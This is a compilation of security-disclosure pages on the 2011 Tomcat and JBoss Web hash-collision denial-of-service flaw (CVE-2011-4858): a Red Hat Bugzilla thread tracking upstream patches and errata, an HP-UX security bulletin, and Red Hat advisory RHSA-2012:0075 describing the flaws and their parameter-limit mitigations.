| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=750521#c0)  Jan Lieskovsky    2011-11-01 13:21:09 UTC  ``` Julian Wälde and Alexander Klink reported a way to degrade performance of the Java Hashtable implementation by filling the hash table with keys with identical hash codes - see [bug #750533](show_bug.cgi?id=750533 "CLOSED WONTFIX - CVE-2012-2739 java: hash table collisions CPU usage DoS (oCERT-2011-003)") for details.  This issue can be used to mount an efficient denial of service attack against Tomcat application server, that parses HTTP request parameters to a hash table and hence exposes this problem.  A remote attack could use that to make Tomcat java process use an excessive amount of CPU time by sending a POST request with large amount of parameters which hash to the same value.   ```  [Comment 2](show_bug.cgi?id=750521#c2)  Jan Lieskovsky    2011-11-01 13:29:04 UTC  ``` Acknowledgements:  Red Hat would like to thank oCERT for reporting this issue. oCERT acknowledges Julian Wälde and Alexander Klink as the original reporters.   ```  [Comment 17](show_bug.cgi?id=750521#c17)  Tomas Hoger    2011-12-29 12:26:18 UTC  ``` This issue was presented on 28C3: <http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html>  Details were posted to full-disclosure: <http://seclists.org/fulldisclosure/2011/Dec/477>  oCERT advisory: <http://www.ocert.org/advisories/ocert-2011-003.html>  n.runs advisory (copy of the full-disclosure post): <http://www.nruns.com/_downloads/advisory28122011.pdf>  28C3 slides and recording: <http://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf> <http://www.youtube.com/28c3#p/u/22/R2Cq3CLI6H8>  Another good write-up of the issue: <http://cryptanalysis.eu/blog/2011/12/28/effective-dos-attacks-against-web-application-plattforms-hashdos/>   ```  [Comment 18](show_bug.cgi?id=750521#c18)  Tomas Hoger    2011-12-29 13:18:53 UTC  ``` As the issue is currently not planned to be addressed in the Java hash table implementation (see [bug #750533, comment #12](show_bug.cgi?id=750533#c12 "CLOSED WONTFIX - CVE-2012-2739 java: hash table collisions CPU usage DoS (oCERT-2011-003)")), Tomcat upstream has added a workaround to protect against this issue.  Tomcat patch introduces support for new connectors parameter - maxParameterCount - which limits the number of parameters processed for a single request.  The default value of 10000 is believed to be high enough to not introduce regression for existing applications and should also mitigate the attack sufficiently.  See upstream announcement for details:  <http://markmail.org/thread/jni4gb5biaolh66t>  Related upstream commits in various SVN branches:  tomcat-7.0.x <http://svn.apache.org/viewvc?view=revision&revision=1189899> <http://svn.apache.org/viewvc?view=revision&revision=1190372> <http://svn.apache.org/viewvc?view=revision&revision=1190482> <http://svn.apache.org/viewvc?view=revision&revision=1194917> <http://svn.apache.org/viewvc?view=revision&revision=1195225> <http://svn.apache.org/viewvc?view=revision&revision=1195226> <http://svn.apache.org/viewvc?view=revision&revision=1195537> <http://svn.apache.org/viewvc?view=revision&revision=1195909> <http://svn.apache.org/viewvc?view=revision&revision=1195944> <http://svn.apache.org/viewvc?view=revision&revision=1195951> <http://svn.apache.org/viewvc?view=revision&revision=1195977> <http://svn.apache.org/viewvc?view=revision&revision=1198641> <http://svn.apache.org/viewvc?view=revision&revision=1200184> <http://svn.apache.org/viewvc?view=revision&revision=1200186> <http://svn.apache.org/viewvc?view=revision&revision=1200218> <http://svn.apache.org/viewvc?view=revision&revision=1200318> <http://svn.apache.org/viewvc?view=revision&revision=1200321> <http://svn.apache.org/viewvc?view=revision&revision=1202708> <http://svn.apache.org/viewvc?view=revision&revision=1224665>  tomcat-6.0.x <http://svn.apache.org/viewvc?view=revision&revision=1200601> <http://svn.apache.org/viewvc?view=revision&revision=1206324>  tomcat-5.5x <http://svn.apache.org/viewvc?view=revision&revision=1221282> <http://svn.apache.org/viewvc?view=revision&revision=1224640>   ```  [Comment 19](show_bug.cgi?id=750521#c19)  Tomas Hoger    2011-12-29 17:05:18 UTC  ``` (In reply to [comment #18](show_bug.cgi?id=750521#c18)) > <http://markmail.org/thread/jni4gb5biaolh66t>  As noted in upstream post, maxParameterCount is available in 7.0.23 and 6.0.35, and should be available in 5.5.35 once released.   ```  [Comment 23](show_bug.cgi?id=750521#c23)  Vincent Danen    2012-01-03 20:57:05 UTC  ``` oCERT made a mistake when publishing the CVE name.  The CVE name for this flaw is _not_ [CVE-2011-4084](https://access.redhat.com/security/cve/CVE-2011-4084), it should have been [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858).  I have updated the bug to reflect this.  [CVE-2011-4084](https://access.redhat.com/security/cve/CVE-2011-4084) will not be used.   ```  [Comment 24](show_bug.cgi?id=750521#c24)  David Jorm    2012-01-03 23:50:46 UTC  ``` JBoss Web is affected by this flaw. The impact is restricted by JBoss Web's limit on the total size of a POST message.   ```  [Comment 27](show_bug.cgi?id=750521#c27)  Vincent Danen    2012-01-05 14:39:54 UTC  ``` Upstream announcement:  <http://markmail.org/message/jni4gb5biaolh66t>   ```  [Comment 34](show_bug.cgi?id=750521#c34)  Tomas Hoger    2012-01-17 13:02:34 UTC  ``` (In reply to [comment #18](show_bug.cgi?id=750521#c18))  Patches for [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) overlap with patches for [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022).  > tomcat-6.0.x > <http://svn.apache.org/viewvc?view=revision&revision=1200601> > <http://svn.apache.org/viewvc?view=revision&revision=1206324>  <http://svn.apache.org/viewvc?view=rev&rev=1229027>  > tomcat-5.5x > <http://svn.apache.org/viewvc?view=revision&revision=1221282> > <http://svn.apache.org/viewvc?view=revision&revision=1224640>  <http://svn.apache.org/viewvc?view=rev&rev=1228191>   ```  [Comment 35](show_bug.cgi?id=750521#c35)  Vincent Danen    2012-01-17 23:40:08 UTC  ``` I see no mention of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) at all on the Tomcat site; are they using [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) _instead_ of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) then?  I'm adding the CVE alias to this bug, but we probably should find out whether or not upstream is even using [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) for anything now, or if this is supposed to be two overlapping CVEs.   ```  [Comment 36](show_bug.cgi?id=750521#c36)  Tomas Hoger    2012-01-18 08:34:18 UTC  ``` (In reply to [comment #35](show_bug.cgi?id=750521#c35)) > I see no mention of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) at all on the Tomcat site; are they using > [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) _instead_ of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) then?  No, my understanding is that while fixing hashdos issue ([CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858)), upstream discovered other issues / inefficiencies in the parameter parsing code.  This is confirmed by the [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) announcement:    <http://markmail.org/thread/c4bvywhk5euqvv7x>    Analysis of the recent hash collision vulnerability identified unrelated   inefficiencies with Apache Tomcat's handling of large numbers of parameters   and parameter values.  All issues were apparently fixed together and the hashdos fix was publicly acknowledged at the same time all other hashdos issues were made public, but these other issues were not mentioned publicly before yesterday announcement.  We should track [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) via a separate bug.   ```  [Comment 37](show_bug.cgi?id=750521#c37)  errata-xmlrpc    2012-01-19 17:22:30 UTC  ``` This issue has been addressed in following products:     JBoss Enterprise Application Platform 4.3.0 CP10  Via RHSA-2012:0041 <https://rhn.redhat.com/errata/RHSA-2012-0041.html>   ```  [Comment 38](show_bug.cgi?id=750521#c38)  Vincent Danen    2012-01-21 00:03:42 UTC  ``` [Bug #783359](show_bug.cgi?id=783359 "CLOSED ERRATA - CVE-2012-0022 tomcat: large number of parameters DoS") was filed to address [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022).   ```  [Comment 41](show_bug.cgi?id=750521#c41)  errata-xmlrpc    2012-01-31 23:04:20 UTC  ``` This issue has been addressed in following products:    JBoss Communications Platform 5.1.3  Via RHSA-2012:0078 <https://rhn.redhat.com/errata/RHSA-2012-0078.html>   ```  [Comment 42](show_bug.cgi?id=750521#c42)  errata-xmlrpc    2012-01-31 23:06:41 UTC  ``` This issue has been addressed in following products:     JBoss Enterprise Web Platform 5.1.2  Via RHSA-2012:0077 <https://rhn.redhat.com/errata/RHSA-2012-0077.html>   ```  [Comment 43](show_bug.cgi?id=750521#c43)  errata-xmlrpc    2012-01-31 23:07:03 UTC  ``` This issue has been addressed in following products:    JBEWP 5 for RHEL 6   JBEWP 5 for RHEL 4   JBEWP 5 for RHEL 5  Via RHSA-2012:0076 <https://rhn.redhat.com/errata/RHSA-2012-0076.html>   ```  [Comment 44](show_bug.cgi?id=750521#c44)  errata-xmlrpc    2012-01-31 23:07:24 UTC  ``` This issue has been addressed in following products:    JBoss Enterprise Application Platform 5.1.2  Via RHSA-2012:0075 <https://rhn.redhat.com/errata/RHSA-2012-0075.html>   ```  [Comment 45](show_bug.cgi?id=750521#c45)  errata-xmlrpc    2012-01-31 23:07:50 UTC  ``` This issue has been addressed in following products:    JBEAP 5 for RHEL 6   JBEAP 5 for RHEL 4   JBEAP 5 for RHEL 5  Via RHSA-2012:0074 <https://rhn.redhat.com/errata/RHSA-2012-0074.html>   ```  [Comment 47](show_bug.cgi?id=750521#c47)  errata-xmlrpc    2012-02-01 21:58:52 UTC  ``` This issue has been addressed in following products:    JBoss Operations Network 2.4.2  Via RHSA-2012:0089 <https://rhn.redhat.com/errata/RHSA-2012-0089.html>   ```  [Comment 48](show_bug.cgi?id=750521#c48)  errata-xmlrpc    2012-02-02 22:20:23 UTC  ``` This issue has been addressed in following products:    JBoss Enterprise Portal Platform 4.3 CP07  Via RHSA-2012:0091 <https://rhn.redhat.com/errata/RHSA-2012-0091.html>   ```  [Comment 53](show_bug.cgi?id=750521#c53)  errata-xmlrpc    2012-02-22 05:11:19 UTC  ``` This issue has been addressed in following products:  JBoss Enterprise BRMS Platform 5.2.0, JBoss Enterprise Portal Platform 5.2.0 and JBoss Enterprise SOA Platform 5.2.0  Via RHSA-2012:0325 <https://rhn.redhat.com/errata/RHSA-2012-0325.html>   ```  [Comment 59](show_bug.cgi?id=750521#c59)  errata-xmlrpc    2012-03-20 17:09:15 UTC  ``` This issue has been addressed in following products:    JBoss Operations Network 3.0.1  Via RHSA-2012:0406 <https://rhn.redhat.com/errata/RHSA-2012-0406.html>   ```  [Comment 65](show_bug.cgi?id=750521#c65)  errata-xmlrpc    2012-04-11 17:17:21 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 6  Via RHSA-2012:0475 <https://rhn.redhat.com/errata/RHSA-2012-0475.html>   ```  [Comment 66](show_bug.cgi?id=750521#c66)  errata-xmlrpc    2012-04-11 17:17:45 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5  Via RHSA-2012:0474 <https://rhn.redhat.com/errata/RHSA-2012-0474.html>   ```  [Comment 68](show_bug.cgi?id=750521#c68)  errata-xmlrpc    2012-05-21 16:33:11 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0 for RHEL 5   JBEWS 1.0 for RHEL 6  Via RHSA-2012:0680 <https://rhn.redhat.com/errata/RHSA-2012-0680.html>   ```  [Comment 69](show_bug.cgi?id=750521#c69)  errata-xmlrpc    2012-05-21 16:34:20 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0  Via RHSA-2012:0679 <https://rhn.redhat.com/errata/RHSA-2012-0679.html>   ```  [Comment 70](show_bug.cgi?id=750521#c70)  errata-xmlrpc    2012-05-21 16:41:44 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0  Via RHSA-2012:0681 <https://rhn.redhat.com/errata/RHSA-2012-0681.html>   ```  [Comment 71](show_bug.cgi?id=750521#c71)  errata-xmlrpc    2012-05-21 16:52:43 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0 for RHEL 5   JBEWS 1.0 for RHEL 6  Via RHSA-2012:0682 <https://rhn.redhat.com/errata/RHSA-2012-0682.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=750521&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from marc.info_f7ae51a8_20250125_074710.html ===

```
[[prev in list](?l=bugtraq&m=132864036317564&w=2)] [[next in list](?l=bugtraq&m=132871732817542&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=133114606103496&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [[security bulletin] HPSBUX02741 SSRT100728 rev.1 - HP-UX Apache Running Tomcat Servlet Engine, Remot](?t=132871670000002&r=1&w=2)
From:       [security-alert () hp ! com](?a=90366096700007&r=1&w=2)
Date:       [2012-02-07 21:33:27](?l=bugtraq&r=1&w=2&b=201202)
Message-ID: [20120207213327.DD2AB1FD56 () security ! hp ! com](?i=20120207213327.DD2AB1FD56%20()%20security%20!%20hp%20!%20com)
[Download RAW [message](?l=bugtraq&m=132871655717248&q=mbox) or [body](?l=bugtraq&m=132871655717248&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

SUPPORT COMMUNICATION - SECURITY BULLETIN

Document ID: c03183543
Version: 1

HPSBUX02741 SSRT100728 rev.1 - HP-UX Apache Running Tomcat Servlet Engine, Remote \
Denial of Service (DoS), Access Restriction Bypass

NOTICE: The information in this Security Bulletin should be acted upon as soon as \
possible.

Release Date: 2012-02-06
Last Updated: 2012-02-06

 ------------------------------------------------------------------------------

Potential Security Impact: Remote Denial of Service (DoS), access restriction bypass

Source: Hewlett-Packard Company, HP Software Security Response Team

VULNERABILITY SUMMARY
Potential security vulnerabilities have been identified with HP-UX Apache Running \
Tomcat Servlet Engine. These vulnerabilities could be exploited remotely to create a \
Denial of Service (DoS) or to perform an access restriction bypass. The Tomcat-based \
Servlet Engine is contained in the HP-UX Apache Web Server Suite.

References: CVE-2006-7243, CVE-2011-4858, CVE-2011-4885, CVE-2012-0022

SUPPORTED SOFTWARE VERSIONS*: ONLY impacted versions are listed.
HP-UX B.11.23, B.11.31 running HP-UX Apache Web Server Suite v3.21 or earlier

BACKGROUND

CVSS 2.0 Base Metrics
===========================================================
  Reference              Base Vector             Base Score
CVE-2006-7243    (AV:N/AC:L/Au:N/C:N/I:P/A:N)       5.0
CVE-2011-4858    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2011-4885    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2012-0022    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
===========================================================
             Information on CVSS is documented
            in HP Customer Notice: HPSN-2008-002

RESOLUTION

HP has provided the following software updates to resolve the vulnerability.
The updates are available for download from
ftp://srt10728:Secure12@ftp.usa.hp.com

Note: HP-UX Web Server Suite v3.22 contains HP-UX Tomcat-based Servlet Engine \
v5.5.35.01

Web Server Suite Version
 Apache Depot Name

HP-UX Web Server Suite v.3.22
HP-UX B.11.23 HPUXWS22ATW-B322-64.depot

HP-UX B.11.23 HPUXWS22ATW-B322-32.depot

HP-UX B.11.31 HPUXWS22ATW-B322-64.depot

HP-UX B.11.31 HPUXWS22ATW-B322-32.depot

MANUAL ACTIONS: Yes - Update
Install HP-UX Web Server Suite v3.22 or subsequent.

PRODUCT SPECIFIC INFORMATION

HP-UX Software Assistant: HP-UX Software Assistant is an enhanced application that \
replaces HP-UX Security Patch Check. It analyzes all Security Bulletins issued by HP \
and lists recommended actions that may apply to a specific HP-UX system. It can also \
download patches and create a depot automatically. For more information see \
<https://www.hp.com/go/swa>

The following text is for use by the HP-UX Software Assistant.

AFFECTED VERSIONS

HP-UX Web Server Suite

HP-UX B.11.23
HP-UX B.11.31
==================
hpuxws22TOMCAT.TOMCAT
action: install revision B.5.5.35.01 or subsequent

hpuxws22APCH32.APACHE
hpuxws22APCH32.APACHE2
hpuxws22APCH32.AUTH_LDAP
hpuxws22APCH32.AUTH_LDAP2
hpuxws22APCH32.MOD_JK
hpuxws22APCH32.MOD_JK2
hpuxws22APCH32.MOD_PERL
hpuxws22APCH32.MOD_PERL2
hpuxws22APCH32.PHP
hpuxws22APCH32.PHP2
hpuxws22APCH32.WEBPROXY
action: install revision B.2.2.15.11 or subsequent

END AFFECTED VERSION

HISTORY
Version:1 (rev.1) - 06 February 2012 Initial release

Third Party Security Patches: Third party security patches that are to be installed \
on systems running HP software products should be applied in accordance with the \
customer's patch management policy.

Support: For issues about implementing the recommendations of this Security Bulletin, \
contact normal HP Services support channel.  For other issues about the content of \
this Security Bulletin, send e-mail to security-alert@hp.com.

Report: To report a potential security vulnerability with any HP supported product, \
send Email to: security-alert@hp.com

Subscribe: To initiate a subscription to receive future HP Security Bulletin alerts \
via Email: <http://h41183.www4.hp.com/signup_alerts.php?jumpid=hpsc_secbulletins>

Security Bulletin List: A list of HP Security Bulletins, updated periodically, is \
contained in HP Security Notice HPSN-2011-001: \
<https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c02964430>

Security Bulletin Archive: A list of recently released Security Bulletins is \
available here: <http://h20566.www2.hp.com/portal/site/hpsc/public/kb/secBullArchive/>

Software Product Category: The Software Product Category is represented in the title \
by the two characters following HPSB.

3C = 3COM
3P = 3rd Party Software
GN = HP General Software
HF = HP Hardware and Firmware
MP = MPE/iX
MU = Multi-Platform Software
NS = NonStop Servers
OV = OpenVMS
PI = Printing and Imaging
PV = ProCurve
ST = Storage Software
TU = Tru64 UNIX
UX = HP-UX

Copyright 2012 Hewlett-Packard Development Company, L.P.
Hewlett-Packard Company shall not be liable for technical or editorial errors or \
omissions contained herein. The information provided is provided "as is" without \
warranty of any kind. To the extent permitted by law, neither HP or its affiliates, \
subcontractors or suppliers will be liable for incidental,special or consequential \
damages including downtime cost; lost profits;damages relating to the procurement of \
substitute products or services; or damages for loss of data, or software \
restoration. The information in this document is subject to change without notice. \
Hewlett-Packard Company and the names of Hewlett-Packard products referenced herein \
are trademarks of Hewlett-Packard Company in the United States and other countries. \
Other product and company names mentioned herein may be trademarks of their \
                respective owners.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAk8wTt0ACgkQ4B86/C0qfVno3QCfZcYhXRNaSBkjdb3mNEN6X4YS
mN8An2X+ZiallrAV3NcTWqbB9oP7t3j3
=AZ4n
-----END PGP SIGNATURE-----

[[prev in list](?l=bugtraq&m=132864036317564&w=2)] [[next in list](?l=bugtraq&m=132871732817542&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=133114606103496&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from rhn.redhat.com_1596018e_20250125_074713.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2012:0075 - Security Advisory

Issued:
2012-01-31
Updated:
2012-01-31
# RHSA-2012:0075 - Security Advisory

* [Overview](#overview)

## Synopsis

Important: jbossweb security update

## Type/Severity

Security Advisory: Important

## Topic

An update for JBoss Enterprise Application Platform 5.1.2 that fixes
multiple security issues is now available from the Red Hat Customer Portal.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

JBoss Web is the web container, based on Apache Tomcat, in JBoss Enterprise
Application Platform. It provides a single deployment platform for the
JavaServer Pages (JSP) and Java Servlet technologies.

A flaw was found in the way JBoss Web handled UTF-8 surrogate pair
characters. If JBoss Web was hosting an application with UTF-8 character
encoding enabled, or that included user-supplied UTF-8 strings in a
response, a remote attacker could use this flaw to cause a denial of
service (infinite loop) on the JBoss Web server. (CVE-2011-4610)

It was found that the Java hashCode() method implementation was
susceptible to predictable hash collisions. A remote attacker could use
this flaw to cause JBoss Web to use an excessive amount of CPU time by
sending an HTTP request with a large number of parameters whose names map
to the same hash value. This update introduces a limit on the number of
parameters and headers processed per request to mitigate this issue. The
default limit is 512 for parameters and 128 for headers. These defaults
can be changed by setting the
org.apache.tomcat.util.http.Parameters.MAX\_COUNT and
org.apache.tomcat.util.http.MimeHeaders.MAX\_COUNT system properties in
"jboss-as/server/[PROFILE]/deploy/properties-service.xml". (CVE-2011-4858)

It was found that JBoss Web did not handle large numbers of parameters and
large parameter values efficiently. A remote attacker could make a JBoss
Web server use an excessive amount of CPU time by sending an HTTP request
containing a large number of parameters or large parameter values. This
update introduces limits on the number of parameters and headers processed
per request to address this issue. Refer to the CVE-2011-4858 description
for information about the org.apache.tomcat.util.http.Parameters.MAX\_COUNT
and org.apache.tomcat.util.http.MimeHeaders.MAX\_COUNT system properties.
(CVE-2012-0022)

Multiple flaws were found in the way JBoss Web handled HTTP DIGEST
authentication. These flaws weakened the JBoss Web HTTP DIGEST
authentication implementation, subjecting it to some of the weaknesses of
HTTP BASIC authentication, for example, allowing remote attackers to
perform session replay attacks. (CVE-2011-1184, CVE-2011-5062,
CVE-2011-5063, CVE-2011-5064)

A flaw was found in the way JBoss Web handled sendfile request attributes
when using the HTTP APR (Apache Portable Runtime) or NIO (Non-Blocking I/O)
connector. A malicious web application running on a JBoss Web instance
could use this flaw to bypass security manager restrictions and gain access
to files it would otherwise be unable to access, or possibly terminate the
Java Virtual Machine (JVM). (CVE-2011-2526)

Red Hat would like to thank NTT OSSC for reporting CVE-2011-4610; oCERT for
reporting CVE-2011-4858; and the Apache Tomcat project for reporting
CVE-2011-2526. oCERT acknowledges Julian Wälde and Alexander Klink as the
original reporters of CVE-2011-4858.

Warning: Before applying this update, back up your JBoss Enterprise
Application Platform's "jboss-as/server/[PROFILE]/deploy/" directory, along
with all other customized configuration files.

All users of JBoss Enterprise Application Platform 5.1.2 as provided from
the Red Hat Customer Portal are advised to install this update.

## Solution

The References section of this erratum contains a download link (you must
log in to download the update).

